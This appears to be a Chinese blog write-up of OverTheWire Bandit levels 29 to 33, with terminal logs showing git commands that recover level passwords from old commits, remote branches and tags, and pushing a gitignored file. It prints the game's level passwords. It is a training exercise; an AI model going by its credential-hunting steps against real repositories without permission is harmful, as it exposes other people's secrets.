bandit29</span><br><span class="line">- password: bbc96594b4e001778eee9975372716b2</span><br><span class="line"></span><br><span class="line">bandit28@bandit:/tmp/b28r/repo$ git reset --hard b67405defc6ef44210c53345fc953e6a21338cc7</span><br><span class="line">HEAD is now at b67405d initial commit of README.md</span><br><span class="line">bandit28@bandit:/tmp/b28r/repo$ cat README.md </span><br><span class="line"><span class="comment"># Bandit Notes</span></span><br><span class="line">Some notes <span class="keyword">for</span> level29 of bandit.</span><br><span class="line"></span><br><span class="line"><span class="comment">## credentials</span></span><br><span class="line"></span><br><span class="line">- username: bandit29</span><br><span class="line">- password: &lt;TBD&gt;</span><br><span class="line"></span><br><span class="line">bandit28@bandit:/tmp/b28r/repo$</span><br></pre></td></tr></table></figure><p>老办法，直接tmp目录创建新目录，然后clone</p><p>发现README里明显有一个假flag<code>xxxxxx</code>，其他也没啥东西可推测的，题目也就只有一个git的提示，我们便想到git的分支和回滚，查看<code>branch</code>发现没有其他分支，<code>git log</code>发现有以前的提交，利用命令<code>git reset --hard &lt;commit_id&gt;</code>回滚到对应版本，然后<code>cat README.md</code>得到flag：<code>bbc96594b4e001778eee9975372716b2</code></p><blockquote><p>还可以用<code>git show</code>查看版本差别</p></blockquote><h3 id="level-30"><a href="#level-30" class="headerlink" title="level 30"></a>level 30</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">  Enjoy your stay!</span><br><span class="line"></span><br><span class="line">bandit29@bandit:~$ mkdir /tmp/b29r</span><br><span class="line">bandit29@bandit:~$ <span class="built_in">cd</span> /tmp/b29r</span><br><span class="line">bandit29@bandit:/tmp/b29r$ git <span class="built_in">clone</span> ssh://bandit29-git@localhost/home/bandit29-git/repo</span><br><span class="line">Cloning into <span class="string">'repo'</span>...</span><br><span class="line">Could not create directory <span class="string">'/home/bandit29/.ssh'</span>.</span><br><span class="line">The authenticity of host <span class="string">'localhost (127.0.0.1)'</span> can<span class="string">'t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Failed to add the host to the list of known hosts (/home/bandit29/.ssh/known_hosts).</span></span><br><span class="line"><span class="string">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">bandit29-git@localhost'</span>s password: </span><br><span class="line">remote: Counting objects: 16, <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (11/11), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 16 (delta 2), reused 0 (delta 0)</span><br><span class="line">Receiving objects: 100% (16/16), <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (2/2), <span class="keyword">done</span>.</span><br><span class="line">bandit29@bandit:/tmp/b29r$ ls</span><br><span class="line">repo</span><br><span class="line">bandit29@bandit:/tmp/b29r$ <span class="built_in">cd</span> repo</span><br><span class="line">bandit29@bandit:/tmp/b29r/repo$ ls</span><br><span class="line">README.md</span><br><span class="line">bandit29@bandit:/tmp/b29r/repo$ cat README.md </span><br><span class="line"><span class="comment"># Bandit Notes</span></span><br><span class="line">Some notes <span class="keyword">for</span> bandit30 of bandit.</span><br><span class="line"></span><br><span class="line"><span class="comment">## credentials</span></span><br><span class="line"></span><br><span class="line">- username: bandit30</span><br><span class="line">- password: &lt;no passwords <span class="keyword">in</span> production!&gt;</span><br><span class="line"></span><br><span class="line">bandit29@bandit:/tmp/b29r/repo$ git <span class="built_in">log</span></span><br><span class="line">commit 84abedc104bbc0c65cb9eb74eb1d3057753e70f8</span><br><span class="line">Author: Ben Dover &lt;noone@overthewire.org&gt;</span><br><span class="line">Date:   Tue Oct 16 14:00:41 2018 +0200</span><br><span class="line"></span><br><span class="line">    fix username</span><br><span class="line"></span><br><span class="line">commit 9b19e7d8c1aadf4edcc5b15ba8107329ad6c5650</span><br><span class="line">Author: Ben Dover &lt;noone@overthewire.org&gt;</span><br><span class="line">Date:   Tue Oct 16 14:00:41 2018 +0200</span><br><span class="line"></span><br><span class="line">    initial commit of README.md</span><br><span class="line">bandit29@bandit:/tmp/b29r/repo$ ls .git/branches/</span><br><span class="line">bandit29@bandit:/tmp/b29r/repo$ ls .git</span><br><span class="line">branches  description  hooks  info  objects      refs</span><br><span class="line">config    HEAD         index  logs  packed-refs</span><br><span class="line">bandit29@bandit:/tmp/b29r/repo$ cat .git/config </span><br><span class="line">[core]</span><br><span class="line">4repositoryformatversion = 0</span><br><span class="line">4filemode = <span class="literal">true</span></span><br><span class="line">4bare = <span class="literal">false</span></span><br><span class="line">4logallrefupdates = <span class="literal">true</span></span><br><span class="line">[remote <span class="string">"origin"</span>]</span><br><span class="line">4url = ssh://bandit29-git@localhost/home/bandit29-git/repo</span><br><span class="line">4fetch = +refs/heads/*:refs/remotes/origin/*</span><br><span class="line">[branch <span class="string">"master"</span>]</span><br><span class="line">4remote = origin</span><br><span class="line">4merge = refs/heads/master</span><br><span class="line">bandit29@bandit:/tmp/b29r/repo$ git reset --hard 84abedc104bbc0c65cb9eb74eb1d3057753e70f8</span><br><span class="line">HEAD is now at 84abedc fix username</span><br><span class="line">bandit29@bandit:/tmp/b29r/repo$ ls</span><br><span class="line">README.md</span><br><span class="line">bandit29@bandit:/tmp/b29r/repo$ cat README.md </span><br><span class="line"><span class="comment"># Bandit Notes</span></span><br><span class="line">Some notes <span class="keyword">for</span> bandit30 of bandit.</span><br><span class="line"></span><br><span class="line"><span class="comment">## credentials</span></span><br><span class="line"></span><br><span class="line">- username: bandit30</span><br><span class="line">- password: &lt;no passwords <span class="keyword">in</span> production!&gt;</span><br><span class="line"></span><br><span class="line">bandit29@bandit:/tmp/b29r/repo$ </span><br><span class="line">bandit29@bandit:/tmp/b29r/repo$ cat .git/HEAD </span><br><span class="line">ref: refs/heads/master</span><br><span class="line">bandit29@bandit:/tmp/b29r/repo$ git branch</span><br><span class="line">* master</span><br><span class="line">bandit29@bandit:/tmp/b29r/repo$ git branch -a</span><br><span class="line">* master</span><br><span class="line">  remotes/origin/HEAD -&gt; origin/master</span><br><span class="line">  remotes/origin/dev</span><br><span class="line">  remotes/origin/master</span><br><span class="line">  remotes/origin/sploits-dev</span><br><span class="line">bandit29@bandit:/tmp/b29r/repo$ git checkout origin/dev</span><br><span class="line">Note: checking out <span class="string">'origin/dev'</span>.</span><br><span class="line"></span><br><span class="line">You are <span class="keyword">in</span> <span class="string">'detached HEAD'</span> state. You can look around, make experimental</span><br><span class="line">changes and commit them, and you can discard any commits you make <span class="keyword">in</span> this</span><br><span class="line">state without impacting any branches by performing another checkout.</span><br><span class="line"></span><br><span class="line">If you want to create a new branch to retain commits you create, you may</span><br><span class="line"><span class="keyword">do</span> so (now or later) by using -b with the checkout <span class="built_in">command</span> again. Example:</span><br><span class="line"></span><br><span class="line">  git checkout -b &lt;new-branch-name&gt;</span><br><span class="line"></span><br><span class="line">HEAD is now at 33ce2e9... add data needed <span class="keyword">for</span> development</span><br><span class="line">bandit29@bandit:/tmp/b29r/repo$ ls</span><br><span class="line">code  README.md</span><br><span class="line">bandit29@bandit:/tmp/b29r/repo$ cat README.md </span><br><span class="line"><span class="comment"># Bandit Notes</span></span><br><span class="line">Some notes <span class="keyword">for</span> bandit30 of bandit.</span><br><span class="line"></span><br><span class="line"><span class="comment">## credentials</span></span><br><span class="line"></span><br><span class="line">- username: bandit30</span><br><span class="line">- password: 5b90576bedb2cc04c86a9e924ce42faf</span><br><span class="line"></span><br><span class="line">bandit29@bandit:/tmp/b29r/repo$ ls code</span><br><span class="line">gif2ascii.py</span><br><span class="line">bandit29@bandit:/tmp/b29r/repo$ cat code/gif2ascii.py </span><br><span class="line"></span><br><span class="line">bandit29@bandit:/tmp/b29r/repo$</span><br></pre></td></tr></table></figure><p><code>git log</code>发现就只有两次提交，<code>cat README</code>发现说密码不在production</p><blockquote><p><a href="https://www.cnblogs.com/jiangzhaowei/p/7879916.html" target="_blank" rel="noopener">https://www.cnblogs.com/jiangzhaowei/p/7879916.html</a></p></blockquote><p>这里果然出现了中英的差别，百度才得知production就是我们通常所说的master分支，上文中可以看到git开发中常见的几个分支<code>dev</code>，<code>master</code>，<code>release</code>等</p><p>直接<code>git branch -a</code>查看所有分支，切换到<code>dev</code>分支，便得到了flag：<code>5b90576bedb2cc04c86a9e924ce42faf</code></p><h3 id="level-31"><a href="#level-31" class="headerlink" title="level 31"></a>level 31</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">bandit30@bandit:~$ mkdir /tmp/b30r</span><br><span class="line">bandit30@bandit:~$ <span class="built_in">cd</span> /tmp/b30r</span><br><span class="line">bandit30@bandit:/tmp/b30r$ ls</span><br><span class="line">bandit30@bandit:/tmp/b30r$ git <span class="built_in">clone</span> ssh://bandit30-git@localhost/home/bandit30-git/repo</span><br><span class="line">Cloning into <span class="string">'repo'</span>...</span><br><span class="line">Could not create directory <span class="string">'/home/bandit30/.ssh'</span>.</span><br><span class="line">The authenticity of host <span class="string">'localhost (127.0.0.1)'</span> can<span class="string">'t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Failed to add the host to the list of known hosts (/home/bandit30/.ssh/known_hosts).</span></span><br><span class="line"><span class="string">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">bandit30-git@localhost'</span>s password: </span><br><span class="line">remote: Counting objects: 4, <span class="keyword">done</span>.</span><br><span class="line">remote: Total 4 (delta 0), reused 0 (delta 0)</span><br><span class="line">Receiving objects: 100% (4/4), <span class="keyword">done</span>.</span><br><span class="line">bandit30@bandit:/tmp/b30r$ <span class="built_in">cd</span> repo</span><br><span class="line">bandit30@bandit:/tmp/b30r/repo$ ls</span><br><span class="line">README.md</span><br><span class="line">bandit30@bandit:/tmp/b30r/repo$ cat README.md </span><br><span class="line">just an epmty file... muahaha</span><br><span class="line">bandit30@bandit:/tmp/b30r/repo$ git <span class="built_in">log</span></span><br><span class="line">commit 3aa4c239f729b07deb99a52f125893e162daac9e</span><br><span class="line">Author: Ben Dover &lt;noone@overthewire.org&gt;</span><br><span class="line">Date:   Tue Oct 16 14:00:44 2018 +0200</span><br><span class="line"></span><br><span class="line">    initial commit of README.md</span><br><span class="line">bandit30@bandit:/tmp/b30r/repo$ cat .git/config </span><br><span class="line">[core]</span><br><span class="line">4repositoryformatversion = 0</span><br><span class="line">4filemode = <span class="literal">true</span></span><br><span class="line">4bare = <span class="literal">false</span></span><br><span class="line">4logallrefupdates = <span class="literal">true</span></span><br><span class="line">[remote <span class="string">"origin"</span>]</span><br><span class="line">4url = ssh://bandit30-git@localhost/home/bandit30-git/repo</span><br><span class="line">4fetch = +refs/heads/*:refs/remotes/origin/*</span><br><span class="line">[branch <span class="string">"master"</span>]</span><br><span class="line">4remote = origin</span><br><span class="line">4merge = refs/heads/master</span><br><span class="line">bandit30@bandit:/tmp/b30r/repo$ git branch  -a</span><br><span class="line">* master</span><br><span class="line">  remotes/origin/HEAD -&gt; origin/master</span><br><span class="line">  remotes/origin/master</span><br><span class="line">bandit30@bandit:/tmp/b30r/repo$ ls .git</span><br><span class="line">branches  description  hooks  info  objects      refs</span><br><span class="line">config    HEAD         index  logs  packed-refs</span><br><span class="line">bandit30@bandit:/tmp/b30r/repo$ cat .git/description </span><br><span class="line">Unnamed repository; edit this file <span class="string">'description'</span> to name the repository.</span><br><span class="line">bandit30@bandit:/tmp/b30r/repo$ git status</span><br><span class="line">On branch master</span><br><span class="line">Your branch is up-to-date with <span class="string">'origin/master'</span>.</span><br><span class="line">nothing to commit, working tree clean</span><br><span class="line">bandit30@bandit:/tmp/b30r/repo$ git diff --cache</span><br><span class="line">error: invalid option: --cache</span><br><span class="line">bandit30@bandit:/tmp/b30r/repo$ git diff --cached</span><br><span class="line">bandit30@bandit:/tmp/b30r/repo$ git diff</span><br><span class="line">bandit30@bandit:/tmp/b30r/repo$ git diff HEAD</span><br><span class="line">bandit30@bandit:/tmp/b30r/repo$ git show-ref</span><br><span class="line">3aa4c239f729b07deb99a52f125893e162daac9e refs/heads/master</span><br><span class="line">3aa4c239f729b07deb99a52f125893e162daac9e refs/remotes/origin/HEAD</span><br><span class="line">3aa4c239f729b07deb99a52f125893e162daac9e refs/remotes/origin/master</span><br><span class="line">f17132340e8ee6c159e0a4a6bc6f80e1da3b1aea refs/tags/secret</span><br><span class="line">bandit30@bandit:/tmp/b30r/repo$ git show f17132340e8ee6c159e0a4a6bc6f80e1da3b1aea47e603bb428404d265f59c42920d81e5</span><br><span class="line">bandit30@bandit:/tmp/b30r/repo$</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://cloud.tencent.com/developer/section/1138782" target="_blank" rel="noopener">https://cloud.tencent.com/developer/section/1138782</a></p><p><a href="https://www.softwhy.com/article-8540-1.html" target="_blank" rel="noopener">https://www.softwhy.com/article-8540-1.html</a></p><p><code>git show-ref</code>：查看本地引用</p></blockquote><p>得到了奇奇怪怪的新知识了</p><h3 id="level-32"><a href="#level-32" class="headerlink" title="level 32"></a>level 32</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">bandit31@bandit:~$ mkdir /tmp/b31r</span><br><span class="line">bandit31@bandit:~$ <span class="built_in">cd</span> /tmp/b31r</span><br><span class="line">bandit31@bandit:/tmp/b31r$ git <span class="built_in">clone</span> ssh://bandit31-git@localhosthome/bandit31-git/repo</span><br><span class="line">Cloning into <span class="string">'repo'</span>...</span><br><span class="line">ssh: Could not resolve hostname localhosthome: No address associated with hostname</span><br><span class="line">fatal: Could not <span class="built_in">read</span> from remote repository.</span><br><span class="line"></span><br><span class="line">Please make sure you have the correct access rights</span><br><span class="line">and the repository exists.</span><br><span class="line">bandit31@bandit:/tmp/b31r$ ls</span><br><span class="line">bandit31@bandit:/tmp/b31r$ git <span class="built_in">clone</span> ssh://bandit31-git@localhost/home/bandit31-git/repo</span><br><span class="line">Cloning into <span class="string">'repo'</span>...</span><br><span class="line">Could not create directory <span class="string">'/home/bandit31/.ssh'</span>.</span><br><span class="line">The authenticity of host <span class="string">'localhost (127.0.0.1)'</span> can<span class="string">'t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts).</span></span><br><span class="line"><span class="string">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">bandit31-git@localhost'</span>s password: </span><br><span class="line">remote: Counting objects: 4, <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (3/3), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 4 (delta 0), reused 0 (delta 0)</span><br><span class="line">Receiving objects: 100% (4/4), <span class="keyword">done</span>.</span><br><span class="line">bandit31@bandit:/tmp/b31r$ <span class="built_in">cd</span> repo</span><br><span class="line">bandit31@bandit:/tmp/b31r/repo$ ls</span><br><span class="line">README.md</span><br><span class="line">bandit31@bandit:/tmp/b31r/repo$ cat README.md </span><br><span class="line">This time your task is to push a file to the remote repository.</span><br><span class="line"></span><br><span class="line">Details:</span><br><span class="line">    File name: key.txt</span><br><span class="line">    Content: <span class="string">'May I come in?'</span></span><br><span class="line">    Branch: master</span><br><span class="line"></span><br><span class="line">bandit31@bandit:/tmp/b31r/repo$ touch key.txt</span><br><span class="line">bandit31@bandit:/tmp/b31r/repo$ <span class="built_in">echo</span> <span class="string">'May I come in?'</span> &gt;&gt; key.txt </span><br><span class="line">bandit31@bandit:/tmp/b31r/repo$ cat key.txt </span><br><span class="line">May I come <span class="keyword">in</span>?</span><br><span class="line">bandit31@bandit:/tmp/b31r/repo$ git add key.txt </span><br><span class="line">The following paths are ignored by one of your .gitignore files:</span><br><span class="line">key.txt</span><br><span class="line">Use -f <span class="keyword">if</span> you really want to add them.</span><br><span class="line">bandit31@bandit:/tmp/b31r/repo$ git add -f key.txt </span><br><span class="line">bandit31@bandit:/tmp/b31r/repo$ ls -al</span><br><span class="line">total 24</span><br><span class="line">drwxr-sr-x 3 bandit31 root 4096 Feb 26 04:47 .</span><br><span class="line">drwxr-sr-x 3 bandit31 root 4096 Feb 26 04:46 ..</span><br><span class="line">drwxr-sr-x 8 bandit31 root 4096 Feb 26 04:48 .git</span><br><span class="line">-rw-r--r-- 1 bandit31 root    6 Feb 26 04:46 .gitignore</span><br><span class="line">-rw-r--r-- 1 bandit31 root   15 Feb 26 04:47 key.txt</span><br><span class="line">-rw-r--r-- 1 bandit31 root  147 Feb 26 04:46 README.md</span><br><span class="line">bandit31@bandit:/tmp/b31r/repo$ cat .gitignore </span><br><span class="line">*.txt</span><br><span class="line">bandit31@bandit:/tmp/b31r/repo$ git commit -m <span class="string">"Hello"</span></span><br><span class="line">[master de012c9] Hello</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"> create mode 100644 key.txt</span><br><span class="line">bandit31@bandit:/tmp/b31r/repo$ git push</span><br><span class="line">Could not create directory <span class="string">'/home/bandit31/.ssh'</span>.</span><br><span class="line">The authenticity of host <span class="string">'localhost (127.0.0.1)'</span> can<span class="string">'t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts).</span></span><br><span class="line"><span class="string">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">bandit31-git@localhost'</span>s password: </span><br><span class="line">Counting objects: 3, <span class="keyword">done</span>.</span><br><span class="line">Delta compression using up to 4 threads.</span><br><span class="line">Compressing objects: 100% (2/2), <span class="keyword">done</span>.</span><br><span class="line">Writing objects: 100% (3/3), 319 bytes | 0 bytes/s, <span class="keyword">done</span>.</span><br><span class="line">Total 3 (delta 0), reused 0 (delta 0)</span><br><span class="line">remote: <span class="comment">### Attempting to validate files... ####</span></span><br><span class="line">remote: </span><br><span class="line">remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.</span><br><span class="line">remote: </span><br><span class="line">remote: Well <span class="keyword">done</span>! Here is the password <span class="keyword">for</span> the next level:</span><br><span class="line">remote: 56a9bf19c63d650ce78e6ec0354ee45e</span><br><span class="line">remote: </span><br><span class="line">remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.</span><br><span class="line">remote: </span><br><span class="line">To ssh://localhost/home/bandit31-git/repo</span><br><span class="line"> ! [remote rejected] master -&gt; master (pre-receive hook declined)</span><br><span class="line">error: failed to push some refs to <span class="string">'ssh://bandit31-git@localhost/home/bandit31-git/repo'</span></span><br><span class="line">bandit31@bandit:/tmp/b31r/repo$</span><br></pre></td></tr></table></figure><p>这一关目的通过README可看到，是需要push到远程仓库，这对我们再熟悉不过了</p><p>不过，这有个坑就是<code>.gitignore</code>，里面忽略了<code>*.txt</code></p><p>用<code>git add -f</code>或删掉<code>.gitignore</code>都行，然后push上去，这操作太骚了，改写了git push失败的返回结果，在结果里给出了flag</p><h3 id="level-33"><a href="#level-33" class="headerlink" title="level 33"></a>level 33</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">bl@bl-virtual-machine:~/wargame$ ssh bandit32@bandit.labs.overthewire.org -p 2220This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span><br><span class="line"></span><br><span class="line">bandit32@bandit.labs.overthewire.org<span class="string">'s password: </span></span><br><span class="line"><span class="string">Linux bandit 4.18.12 x86_64 GNU/Linux</span></span><br><span class="line"><span class="string">               </span></span><br><span class="line"><span class="string">      ,----..            ,----,          .---. </span></span><br><span class="line"><span class="string">     /   /   \         ,/   .`|         /. ./|</span></span><br><span class="line"><span class="string">    /   .     :      ,`   .'</span>  :     .--<span class="string">'.  '</span> ;</span><br><span class="line">   .   /   ;.  \   ;    ;     /    /__./ \ : |</span><br><span class="line">  .   ;   /  ` ; .<span class="string">'___,/    ,'</span> .--<span class="string">'.  '</span>   \<span class="string">' .</span></span><br><span class="line"><span class="string">  ;   |  ; \ ; | |    :     | /___/ \ |    '</span> <span class="string">' </span></span><br><span class="line"><span class="string">  |   :  | ; | '</span> ;    |.<span class="string">';  ; ;   \  \;      : </span></span><br><span class="line"><span class="string">  .   |  '</span> <span class="string">' '</span> : `----<span class="string">'  |  |  \   ;  `      |</span></span><br><span class="line"><span class="string">  '</span>   ;  \; /  |     <span class="string">'   :  ;   .   \    .\  ; </span></span><br><span class="line"><span class="string">   \   \  '</span>,  /      |   |  <span class="string">'    \   \   '</span> \ |</span><br><span class="line">    ;   :    /       <span class="string">'   :  |     :   '</span>  |--<span class="string">"  </span></span><br><span class="line"><span class="string">     \   \ .'        ;   |.'       \   \ ;     </span></span><br><span class="line"><span class="string">  www. `---` ver     '---' he       '---"</span> ire.org     </span><br><span 